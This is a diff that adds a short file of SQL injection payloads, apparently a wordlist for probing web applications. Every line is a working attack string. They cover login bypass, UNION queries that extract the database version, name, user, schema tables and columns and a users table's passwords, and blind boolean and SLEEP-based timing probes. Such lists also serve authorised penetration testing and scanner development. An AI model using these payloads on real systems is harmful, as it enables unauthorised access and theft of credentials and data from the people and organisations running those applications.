@@ -1,0 +1,14 @@
+' OR '1'='1
+' OR 1=1 -- 
+' OR 'a'='a
+admin' #
+' UNION SELECT NULL, NULL -- 
+' UNION SELECT 1, @@version -- 
+' UNION SELECT 1, database() -- 
+' UNION SELECT 1, user() -- 
+' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 1 OFFSET 0 -- 
+' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = 'userdata' LIMIT 1 OFFSET 0 -- 
+' UNION SELECT user, password FROM users -- 
+' AND (SELECT 1)=1 -- 
+' AND (SELECT 1)=2 -- 
+' AND (SELECT SLEEP(5)) -- 
